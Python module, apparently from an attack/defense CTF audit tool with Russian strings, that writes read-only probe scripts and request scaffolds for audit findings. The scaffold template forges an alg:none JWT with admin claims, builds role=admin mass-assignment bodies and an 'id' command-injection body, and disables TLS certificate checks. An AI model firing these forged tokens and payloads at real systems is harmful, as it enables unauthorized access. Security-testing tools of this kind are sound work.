"""Probe and scaffold generation.

Two artifacts come out of here:

- **Probe** — a standalone script that replays the read-only request list the
  app itself would send. GET only, capped, no checker, prints an evidence table.
- **Scaffold** — a complete request builder for findings that cannot be tested
  with one GET. Dry-run by default, `--send` to fire. Multipart, JSON, form and
  a forged `alg:none` JWT are all built in the script, not described in prose.

Both are linted before they reach the UI.
"""
from __future__ import annotations

import json
import re
from string import Template

from . import patterns
from .lint import lint_code
from .payloads import MANUAL_ONLY, is_probeable
from .probe import build_requests, detect_param, resolve_endpoint

_ENDPOINT_LINE = re.compile(r"""["'](/[^"']*)["']""")


def pick_endpoint(finding: dict, endpoints: list[dict] | None = None) -> str:
    """Best endpoint for a finding.

    The audit already pairs a finding with the route whose handler reads its
    parameter; that pairing wins. Fall back to same-file routes, then context.
    """
    preset = (finding.get("endpoint") or "").strip()
    if preset.startswith("/"):
        return preset
    file = finding.get("file")
    line = finding.get("line") or 0
    candidates = [item for item in (endpoints or []) if item.get("file") == file]
    if candidates:
        candidates.sort(key=lambda item: abs((item.get("line") or 0) - line))
        return candidates[0]["path"]
    for text in finding.get("context", []):
        match = _ENDPOINT_LINE.search(text)
        if match:
            return match.group(1)
    if endpoints:
        return endpoints[0]["path"]
    return "/"


def _slug(value: str) -> str:
    cleaned = re.sub(r"[^a-z0-9]+", "-", value.lower()).strip("-")
    return cleaned[:40] or "probe"


def _port(endpoint: str, default: int = 80) -> int:
    return default


PROBE_SCRIPT = Template('''"""Проба для «${kind}» в ${file}:${line}.

Сервис:   ${service}
Ручка:    ${endpoint}
Запросов: ${count} (только GET, пауза ${delay} с, потолок ${cap})

Запуск:

    python ${name}.py --base http://127.0.0.1:${port}
    python ${name}.py --base http://127.0.0.1:${port} --json

Правила: только GET, ответ читается до ${max_body} байт, редиректы не
переходятся (сам редирект — это улика), пути с упоминанием чекера не
запрашиваются. Между запросами пауза ${delay} с.

Не запускать в цикле и не поднимать параллельно: один запуск — один проход.
"""
from __future__ import annotations

import argparse
import hashlib
import json
import re
import ssl
import sys
import time
import urllib.error
import urllib.request

REQUESTS = ${requests}

TIMEOUT = 4.0
MAX_BODY = ${max_body}
DELAY = ${delay}
BLOCKED = ("/_checker", "putflag", "getflag", "checkflag")


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *args, **kwargs):
        return None


def make_opener():
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    return urllib.request.build_opener(NoRedirect, urllib.request.HTTPSHandler(context=context))


def fetch(opener, url):
    started = time.time()
    request = urllib.request.Request(url, method="GET", headers={"User-Agent": "ad-audit-probe/1.0"})
    try:
        with opener.open(request, timeout=TIMEOUT) as response:
            return response.status, response.read(MAX_BODY), dict(response.headers), int((time.time() - started) * 1000), None
    except urllib.error.HTTPError as error:
        body = error.read(MAX_BODY) if error.fp else b""
        return error.code, body, dict(error.headers or {}), int((time.time() - started) * 1000), None
    except Exception as error:
        return 0, b"", {}, int((time.time() - started) * 1000), type(error).__name__ + ": " + str(error)


def blocked(path):
    lowered = path.lower()
    return any(marker in lowered for marker in BLOCKED)


def run(base):
    base = base.rstrip("/")
    opener = make_opener()
    baseline_status, baseline_body, _, _, _ = fetch(opener, base + REQUESTS[0]["path"])
    rows = []
    for item in REQUESTS:
        path = item["path"]
        if blocked(path):
            rows.append({"label": item["label"], "path": path, "status": 0, "bytes": 0,
                         "ms": 0, "verdict": "blocked", "evidence": "путь упоминает чекер"})
            continue
        status, body, headers, elapsed, error = fetch(opener, base + path)
        text = body.decode("utf-8", "replace")
        haystack = text + "\\n" + "\\n".join(key + ": " + value for key, value in headers.items())
        verdict, evidence = "clean", "маркер не найден"
        if error:
            verdict, evidence = "error", error
        elif item.get("marker") and re.search(item["marker"], haystack):
            verdict = "signal"
            evidence = "совпало: " + repr(re.search(item["marker"], haystack).group(0)[:60])
        elif item.get("compare"):
            delta = abs(len(body) - len(baseline_body))
            ratio = delta / max(1, len(baseline_body))
            if status == 200 and (status != baseline_status or ratio > 0.2):
                verdict = "diff"
                evidence = "базовый %s/%sБ против %s/%sБ" % (baseline_status, len(baseline_body), status, len(body))
            else:
                evidence = "форма как у базового"
        else:
            location = headers.get("Location", "")
            if location:
                evidence = "Location: " + location[:80]
        rows.append({"label": item["label"], "path": path, "status": status, "bytes": len(body),
                     "ms": elapsed, "verdict": verdict, "evidence": evidence,
                     "sha": hashlib.sha256(body).hexdigest()[:10]})
        time.sleep(DELAY)
    return rows


def main(argv=None):
    parser = argparse.ArgumentParser(description="read-only probe")
    parser.add_argument("--base", required=True, help="например http://127.0.0.1:8081")
    parser.add_argument("--json", action="store_true")
    args = parser.parse_args(argv)
    rows = run(args.base)
    if args.json:
        print(json.dumps(rows, ensure_ascii=False, indent=2))
        return 0
    print(f"{'label':<18}{'status':>7}{'bytes':>8}{'ms':>6}  {'verdict':<8} evidence")
    for row in rows:
        print(f"{row['label']:<18}{row['status']:>7}{row['bytes']:>8}{row['ms']:>6}  {row['verdict']:<8} {row['evidence']}")
    signals = sum(1 for row in rows if row["verdict"] == "signal")
    diffs = sum(1 for row in rows if row["verdict"] == "diff")
    print()
    print(f"сигналов: {signals}, различий: {diffs}, запросов: {len(rows)}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
''')


SCAFFOLD_SCRIPT = Template('''"""Заготовка для «${kind}» в ${file}:${line}.

РУЧНАЯ ПРОВЕРКА. Эту находку нельзя проверить одним GET: нужен запрос,
меняющий состояние. Поэтому проба не запускается автоматически.

    python ${name}.py --base http://127.0.0.1:${port}
    python ${name}.py --base http://127.0.0.1:${port} --send

Без --send печатается ровно тот запрос, который уйдёт. С --send он уходит.
Один запрос за запуск. Никогда не направлять на /_checker/*.
"""
from __future__ import annotations

import argparse
import base64
import json
import sys
import urllib.request

MODE = ${mode}
SERVICE = ${service}
PATH = ${path}
METHOD = ${method}
HEADERS = ${headers}
BODY = ${body}
FILE_FIELD = ${file_field}
BOUNDARY = "----adauditboundary7f3a"

# Для JWT: alg:none и пустая подпись. Сервер, который не проверяет алгоритм,
# примет такой токен.
JWT_CLAIMS = ${claims}


def b64url(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).decode().rstrip("=")


def forge_none_jwt(claims: dict) -> str:
    header = b64url(json.dumps({"alg": "none", "typ": "JWT"}, separators=(",", ":")).encode())
    payload = b64url(json.dumps(claims, separators=(",", ":")).encode())
    return header + "." + payload + "."


def build_multipart(field: str, file_path: str) -> bytes:
    with open(file_path, "rb") as handle:
        data = handle.read()
    head = (
        "--" + BOUNDARY + "\\r\\n"
        'Content-Disposition: form-data; name="' + field + '"; filename="probe.txt"\\r\\n'
        "Content-Type: text/plain\\r\\n\\r\\n"
    ).encode()
    tail = ("\\r\\n--" + BOUNDARY + "--\\r\\n").encode()
    return head + data + tail


def build_request(args):
    headers = dict(HEADERS)
    body = None
    path = PATH
    method = METHOD
    if MODE == "json":
        body = BODY.encode()
        headers.setdefault("Content-Type", "application/json")
    elif MODE == "form":
        body = BODY.encode()
        headers.setdefault("Content-Type", "application/x-www-form-urlencoded")
    elif MODE == "multipart":
        body = build_multipart(FILE_FIELD, args.file)
        headers["Content-Type"] = "multipart/form-data; boundary=" + BOUNDARY
    elif MODE == "jwt":
        headers["Authorization"] = "Bearer " + forge_none_jwt(JWT_CLAIMS)
    elif MODE == "raw":
        body = BODY.encode()
    return method, path, headers, body


def main(argv=None):
    parser = argparse.ArgumentParser(description="scaffold: dry-run by default")
    parser.add_argument("--base", required=True)
    parser.add_argument("--send", action="store_true", help="отправить запрос (меняет состояние)")
    parser.add_argument("--file", default="probe.txt", help="файл для multipart")
    args = parser.parse_args(argv)

    method, path, headers, body = build_request(args)
    print(method, args.base.rstrip("/") + path)
    for key, value in headers.items():
        print(key + ":", value)
    if body:
        print()
        print(body.decode("utf-8", "replace")[:2000])

    if not args.send:
        print()
        print("dry-run: запрос не отправлен, добавьте --send")
        return 0

    request = urllib.request.Request(args.base.rstrip("/") + path, data=body, method=method, headers=headers)
    try:
        with urllib.request.urlopen(request, timeout=5) as response:
            text = response.read(65536).decode("utf-8", "replace")
            print()
            print("status:", response.status)
            print(text[:2000])
    except Exception as error:
        print()
        print("ошибка:", type(error).__name__, error)
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(main())
''')


def _kind_mode(kind: str) -> str:
    if kind == "Mass assignment":
        return "json"
    if kind == "Unsafe upload":
        return "multipart"
    if kind == "JWT verification bypass":
        return "jwt"
    if kind in {"Unsafe deserialization", "Remote code execution"}:
        return "raw"
    return "form"


def _kind_path(kind: str, endpoint: str) -> tuple[str, str]:
    """(method, path) implied by the finding class."""
    path = resolve_endpoint(endpoint)[0]
    if kind == "Mass assignment":
        return "POST", path if path != "/" else "/register"
    if kind == "Unsafe upload":
        return "POST", path if path != "/" else "/upload"
    if kind == "JWT verification bypass":
        return "GET", path if path != "/" else "/me"
    if kind == "Unsafe deserialization":
        return "POST", path if path != "/" else "/import"
    if kind == "Remote code execution":
        return "POST", path if path != "/" else "/run"
    return "POST", path if path != "/" else "/"


def _kind_body(kind: str, endpoint: str) -> tuple[str, dict]:
    if kind == "Mass assignment":
        return json.dumps({"name": "probe", "bio": "probe", "role": "admin"}), {}
    if kind == "Unsafe deserialization":
        return "gASVAAAAAAAA", {}
    if kind == "Remote code execution":
        return "id", {}
    if kind == "Unsafe upload":
        return "", {"file_field": "file"}
    if kind == "JWT verification bypass":
        return "", {"claims": {"sub": "admin", "role": "admin"}}
    return "role=admin&name=probe", {}


def build_probe_script(finding: dict, endpoint: str, service: str, port: int = 80) -> dict:
    name = f"{service}-{_slug(finding.get('kind', 'probe'))}"
    requests = build_requests(finding, endpoint, port)
    code = PROBE_SCRIPT.safe_substitute({
        "kind": finding.get("kind", "finding"),
        "file": finding.get("file", "?"),
        "line": finding.get("line", 0),
        "service": service,
        "endpoint": endpoint,
        "count": len(requests),
        "delay": 0.15,
        "cap": 14,
        "max_body": 65536,
        "name": name,
        "port": port,
        "requests": repr(requests),
    })
    return {
        "code": code,
        "name": name,
        "endpoint": endpoint,
        "service": service,
        "requests": requests,
        "manual": False,
        "lint": lint_code(code, "probe"),
    }


def build_scaffold(finding: dict, endpoint: str, service: str, port: int = 80) -> dict:
    kind = finding.get("kind", "finding")
    name = f"{service}-{_slug(kind)}-scaffold"
    mode = _kind_mode(kind)
    method, path = _kind_path(kind, endpoint)
    body, extra = _kind_body(kind, endpoint)
    headers: dict[str, str] = {}
    code = SCAFFOLD_SCRIPT.safe_substitute({
        "kind": kind,
        "file": finding.get("file", "?"),
        "line": finding.get("line", 0),
        "name": name,
        "port": port,
        "mode": json.dumps(mode),
        "service": json.dumps(service),
        "path": json.dumps(path),
        "method": json.dumps(method),
        "headers": json.dumps(headers),
        "body": json.dumps(body),
        "file_field": json.dumps(extra.get("file_field", "file")),
        "claims": json.dumps(extra.get("claims", {"sub": "admin"})),
    })
    return {
        "code": code,
        "name": name,
        "endpoint": path,
        "service": service,
        "requests": [{"label": kind, "method": method, "path": path, "mode": mode, "note": "меняет состояние; только вручную"}],
        "manual": True,
        "lint": lint_code(code, "scaffold"),
    }


def generate_probe(finding: dict, service: str, endpoint: str | None = None,
                   port: int = 80, endpoints: list[dict] | None = None) -> dict:
    target = endpoint or pick_endpoint(finding, endpoints)
    kind = finding.get("kind", "")
    if is_probeable(kind):
        result = build_probe_script(finding, target, service, port)
        result["param"] = detect_param(finding.get("context", []))
        return result
    result = build_scaffold(finding, target, service, port)
    result["param"] = detect_param(finding.get("context", []))
    result["reason"] = "этот класс нельзя проверить одним GET"
    if kind in MANUAL_ONLY:
        result["manual_reason"] = kind
    return result


def generate_report(audit: dict) -> str:
    counts = audit.get("counts", {})
    language_line = ", ".join(
        f"{entry['language']} ×{entry['files']}" for entry in audit.get("languages", [])
    ) or "не определено"
    lines = [
        "# Отчёт аудита A/D",
        "",
        f"- хост: `{audit.get('host', 'unknown')}`",
        f"- время: {audit.get('generated_at', '')}",
        f"- сервисов: {len(audit.get('services', []))}",
        f"- файлов: {len(audit.get('files', []))}",
        f"- языки: {language_line}",
        f"- находок: high {counts.get('high', 0)}, medium {counts.get('medium', 0)}, "
        f"low {counts.get('low', 0)}, info {counts.get('info', 0)}",
        "",
        "## Сервисы",
        "",
        "| порт | сервис | стек | процесс | каталог |",
        "|---:|---|---|---|---|",
    ]
    for service in audit.get("services", []):
        lines.append(
            f"| {service.get('port')} | {service.get('service')} | "
            f"{service.get('stack') or '—'} | {service.get('process')} | `{service.get('cwd')}` |"
        )
    lines += ["", "## Находки", "", "| важность | класс | файл:строка | риск для чекера |", "|---|---|---|---|"]
    for finding in audit.get("findings", [])[:80]:
        lines.append(
            f"| {finding.get('severity')} | {finding.get('kind')} | "
            f"`{finding.get('file')}:{finding.get('line')}` | {finding.get('checker_risk')} |"
        )
    lines += ["", "## Чекер", "", f"> {audit.get('checker', {}).get('warning', '')}", ""]
    for ref in audit.get("checker", {}).get("mentions", [])[:20]:
        lines.append(f"- `{ref}`")
    lines += ["", "## Флаги", ""]
    for literal in audit.get("flags", {}).get("literals", [])[:20]:
        lines.append(f"- литерал: `{literal}`")
    for path in audit.get("flags", {}).get("storage", [])[:20]:
        lines.append(f"- хранилище: `{path}`")
    lines += [
        "",
        "## Дальше",
        "",
        "1. Открыть каждую high-находку и прочитать контекст.",
        "2. Сгенерировать пробу, прогнать на своей копии сервиса.",
        "3. Держать SLA-монитор включённым во время тестов.",
        "4. Патчить по одной дырке за раз, со бэкапом файла.",
        "5. Никогда не отправлять запросы на `/_checker/*`.",
    ]
    return "\n".join(lines) + "\n"
